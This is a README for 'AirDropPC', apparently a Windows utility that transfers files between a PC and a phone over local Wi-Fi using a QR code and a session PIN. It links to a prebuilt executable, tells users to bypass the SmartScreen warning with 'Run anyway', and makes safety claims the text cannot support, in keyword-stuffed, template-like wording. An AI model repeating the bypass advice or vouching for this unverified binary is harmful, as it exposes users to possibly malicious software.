<p align="center">
  <img src="https://i.postimg.cc/qqBJNmNP/banner.png" alt="AirDropPC Wi-Fi Transfer — Instant PC ↔ iPhone & Android File Transfer via QR Code" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-PC%20%E2%86%94%20Phone%20Wi-Fi%20QR-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-airdroppc--v1.3-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# AirDropPC Wi-Fi Transfer — Instant PC ↔ iPhone & Android File Transfer via QR Code

**Tired of emailing photos to yourself, fighting flaky Lightning/USB cables, or letting Telegram/WhatsApp compress your 4K phone videos? Launch AirDropPC, scan the on-screen QR code with your iPhone or Android camera, and transfer full-resolution files over local Wi-Fi.**

AirDropPC Wi-Fi Transfer spins up an instant, PIN-protected local web dropzone on your home router: **requiring zero app installation on your iPhone or Android phone—just scan the QR code in Safari or Chrome to upload or download unlimited full-resolution files at full LAN speed**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) PC users** moving photos, 4K videos, APKs, and documents between Windows and iOS/Android over the same Wi-Fi network.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Messaging apps compress 4K videos and strip original photo quality | Telegram/WhatsApp re-encode media and cap file sizes | Transfer original bit-identical `.MOV`, `.HEIC`, `.MP4`, and `.ZIP` files over LAN |
| iPhone USB cable disconnects or shows only DCIM folders | Windows MTP/PTP file browsing is slow and crashes on large videos | Scan QR code in iPhone Camera -> upload/download directly in Safari |
| Don't want to install another companion app on your phone | Cross-platform transfer tools require matching mobile apps | Works directly in **Safari** (iOS) and **Chrome** (Android) with zero phone app |
| Worried about neighbors on shared Wi-Fi accessing the transfer page | Open local HTTP servers without auth can be guessed on LAN | Require a 4-digit **One-Time Session PIN** + auto-stop when window closes |

## Download for Windows

[**Download AirDropPC.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/AirDropPC.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `AirDropPC.exe`? (Key features)

- Generates a live **QR Code** on screen—scan with iPhone or Android camera to open the transfer page immediately.
- Two-way transfer: **Phone → PC** (select 50+ gallery photos/videos at once) and **PC → Phone** (drag any file onto AirDropPC).
- Transfers at full local Wi-Fi speed (`30–80 MB/s`) with **zero cloud uploads** and **zero quality compression**.
- Protected by a random **4-digit Session PIN** and shuts down the local server the moment you close the window.

### Sample Output

```text
[AirDropPC] Local Wi-Fi Transfer Server Ready (No internet upload used)
[OK]   Local LAN URL    : http://192.168.1.42:8484  (QR Code Displayed)
[OK]   Security PIN     : 4829 (Required on phone browser)
[OK]   Received 14 Files: IMG_5012.MOV (312 MB) -> Saved to C:\Users\Player\Downloads\AirDropPC
```

The release ZIP is named `AirDropPC.zip`; the Windows executable inside is named `AirDropPC.exe`.

1. Close AirDropPC before updating or replacing executable files.
2. Click **Download AirDropPC.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `AirDropPC.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) connected to the same Wi-Fi/router subnet as your iPhone, iPad, or Android device.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `AirDropPC.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### No phone app installation needed

Any iPhone, iPad, Android phone, or MacBook on your Wi-Fi connects via its built-in web browser.

### Full-resolution 4K video & RAW photo transfers

Preserves exact original bytes, EXIF dates, and frame rates.

### Fast local router speeds without eating mobile data

Traffic stays strictly inside your home Wi-Fi router.

### Session PIN security & instant shutdown

Random 4-digit PIN blocks unauthorized LAN access, and closing the app stops the server completely.

## Default folders and configuration paths

AirDropPC saves files received from your phone into `Downloads\AirDropPC`:

```text
%USERPROFILE%\Downloads\AirDropPC\
```

Typical directory layout:

```text
Windows PC (AirDropPC.exe)  <─── Local Wi-Fi (192.168.x.x) ───>  Phone Browser
├── Incoming from Phone -> %USERPROFILE%\Downloads\AirDropPC\
└── Outgoing to Phone   -> Drag & drop files into AirDropPC window
```

Make sure your Windows Wi-Fi network profile is set to **Private** (not Public) if Windows Firewall prompts for local network access.

## Quick start guide

Follow these steps to get started:

1. **Extract `AirDropPC.zip` and launch `AirDropPC.exe`.** Allow Windows Firewall access on your **Private** home network.
2. **Open your iPhone or Android Camera app and scan the QR code on screen.** Enter the 4-digit Session PIN shown in AirDropPC.
3. **Tap **Send Files to PC** on your phone or drag PC files into AirDropPC to download on your phone.** Files transfer at full Wi-Fi speed.
4. **Close `AirDropPC.exe` when finished.** The local transfer server shuts down immediately.

### Data safety note

AirDropPC binds strictly to your local LAN interface and never sends files to external internet servers.

## What the status summary shows

AirDropPC displays **local LAN IP/port, active QR code, 4-digit Session PIN, transfer speed, and received file folder**.

## FAQ

**Do I need to install an app on my iPhone or Android phone?**

No. Just scan the QR code with your phone's built-in camera and use Safari or Chrome.

**Does this use my internet bandwidth or upload files to the cloud?**

No—all data travels directly between your phone and PC over your local Wi-Fi router.

**Does it compress photos or videos like WhatsApp/Telegram?**

No. Every photo, 4K video, and document transfers bit-for-bit at 100% original quality.

## Useful reading

- [Microsoft Support — Make a Wi-Fi Network Public or Private in Windows](https://support.microsoft.com/en-us/windows/make-a-wi-fi-network-public-or-private-in-windows-0460117d-8d3e-a7ac-f003-7a0da607448d)

## More Windows Desktop Utilities

- [SnapFormat-BatchMediaConverter](../SnapFormat-BatchMediaConverter) — Offline batch HEIC/WebP/MKV to JPG/PNG/MP4 converter
- [ExifScrub-PhotoMetadataCleaner](../ExifScrub-PhotoMetadataCleaner) — Strip GPS, EXIF & camera metadata from photos offline
- [PortWatch-LocalPortKiller](../PortWatch-LocalPortKiller) — Find & free blocked Windows TCP/UDP ports in one click
- [VaultAuth-Desktop2FATOTP](../VaultAuth-Desktop2FATOTP) — Offline encrypted Windows 2FA TOTP authenticator

*Independent open-source desktop utility for Windows. Not affiliated with Apple Inc.*
